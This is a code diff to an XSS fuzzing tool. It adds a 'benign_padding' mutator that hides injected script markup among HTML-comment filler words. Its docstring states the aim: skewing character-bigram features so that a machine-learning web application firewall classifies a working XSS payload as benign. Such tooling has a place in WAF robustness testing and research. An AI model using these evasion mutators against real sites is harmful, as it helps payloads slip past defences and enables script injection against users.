@@ -258,6 +258,43 @@ def quoteless_vector(payload):
     return prefix + markup[:match.start()] + variant + markup[match.end():]
 
 
+_BENIGN_WORDS = (
+    "the quick brown fox jumps over a lazy dog while people read the news and "
+    "share photos of their family holidays booking hotels flights and trains "
+    "for summer travel around europe with friends looking at menus recipes and "
+    "reviews of local restaurants shops libraries museums gardens and parks "
+    "where children play football tennis and ride bicycles on sunny afternoons "
+    "students study history science music and art at school and university "
+    "writing essays about weather markets farming business health and education"
+).split()
+
+
+def benign_padding(payload):
+    """Dilute the character-bigram distribution with benign text.
+
+    A character n-gram TF-IDF classifier scores on the *relative* frequency of
+    character bigrams. Surrounding the injected markup with a large block of
+    benign words (inside an HTML comment, so the browser ignores it and the
+    script still executes) lowers the normalised weight of the markup bigrams
+    and can push the sample across the SVM boundary toward benign, without
+    changing what the payload does. This targets the ML WAF specifically;
+    rule-based engines still see the intact tag.
+    """
+    prefix, markup = _split_markup(payload)
+    if not markup:
+        return payload
+    count = random.randint(60, 140)
+    filler = " ".join(random.choice(_BENIGN_WORDS) for _ in range(count))
+    pad = f"<!-- {filler} -->"
+    # Pad on whichever side(s) keep the executable markup untouched.
+    placement = random.choice(('before', 'after', 'both'))
+    if placement == 'before':
+        return f"{prefix}{pad}{markup}"
+    if placement == 'after':
+        return f"{prefix}{markup}{pad}"
+    return f"{prefix}{pad}{markup}{pad}"
+
+
 class XssFuzzer:
     """Generate bounded, compounded XSS representations.
 
@@ -282,6 +319,7 @@ class XssFuzzer:
         js_fromcharcode,
         scheme_obfuscation,
         quoteless_vector,
+        benign_padding,
     ]
 
     def __init__(self, payload, max_length=2048, max_chain=4, max_attempts=16):
